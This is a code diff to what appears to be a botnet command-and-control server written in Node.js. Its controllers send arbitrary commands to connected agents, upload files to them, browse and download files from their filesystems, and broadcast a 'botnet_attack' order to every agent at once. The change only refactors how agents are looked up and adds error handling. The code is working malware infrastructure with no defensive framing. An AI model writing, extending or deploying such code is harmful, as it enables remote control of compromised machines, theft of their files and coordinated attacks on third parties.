@@ -4,37 +4,45 @@ import Operation from '../models/Operations_model.mjs';
 
 
 const send_cmd = async (clients, req, res) => {
-    const clientId = req.params.id;
-    const client = clients.get(clientId);
 
-    if (!client || client.readyState !== 1) {
-        return res.status(404).json({ error: 'Disconnected client' });
-    }
-
-    const msgHandler = (msg) => {
-        try {
-            const parsed = JSON.parse(msg);
-            res.status(200).json(parsed);
-        } catch (e) {
-            res.status(200).json({ result: msg });
+    try {
+        
+        const clientId = req.params.id;
+        
+        const client = clients.agents.get(clientId);
+    
+        if (!client || client.readyState !== 1) {
+            return res.status(404).json({ error: 'Disconnected client' });
         }
-        client.off('message', msgHandler);
-    };
-
-    client.on('message', msgHandler);
-    client.send(JSON.stringify(req.body));
-
-    setTimeout(() => {
-        client.off('message', msgHandler);
-        if (!res.headersSent) {
-            res.status(504).json({ error: 'Timeout client error' });
-        }
-    }, 5000);
+    
+        const msgHandler = (msg) => {
+            try {
+                const parsed = JSON.parse(msg);
+                res.status(200).json(parsed);
+            } catch (e) {
+                res.status(200).json({ result: msg });
+            }
+            client.off('message', msgHandler);
+        };
+    
+        client.on('message', msgHandler);
+        client.send(JSON.stringify(req.body));
+    
+        setTimeout(() => {
+            client.off('message', msgHandler);
+            if (!res.headersSent) {
+                res.status(504).json({ error: 'Timeout client error' });
+            }
+        }, 5000);
+    } catch (error) {
+        console.log(error);
+        
+    }    
 };
 const upload_file = async (clients, req, res) => {
     try {
         const clientId = req.params.id;
-        const client = clients.get(clientId);
+        const client = clients.agents.get(clientId);
         const destination = req.body.destination;
 
         if (!client || client.readyState !== 1) {
@@ -97,7 +105,7 @@ const getFiles= async(clients, req, res = response) => {
     const path = req.body.path || "/";
     const clientId = req.body.id;
 
-    const client = clients.get(clientId);
+    const client = clients.agents.get(clientId);
 
     if (!client || client.readyState !== 1) {
         return res.status(404).json({ error: 'Client has been disconnected' });
@@ -131,7 +139,7 @@ const getFiles= async(clients, req, res = response) => {
 const downloadFiles=async (clients, req, res = response) => {
     const path = req.body.path || "/";
     const clientId = req.body.id;
-    const client = clients.get(clientId);
+    const client = clients.agents.get(clientId);
 
 
     if (!client || client.readyState !== 1) {
@@ -212,7 +220,7 @@ const botnet_attack=(clients, attacks_running, req, res = response)=>{
         }
     */
     
-    for (const [clientid, client] of clients) {
+    for (const [clientid, client] of clients.agents) {
         client.send(JSON.stringify(req.body));
     }
 
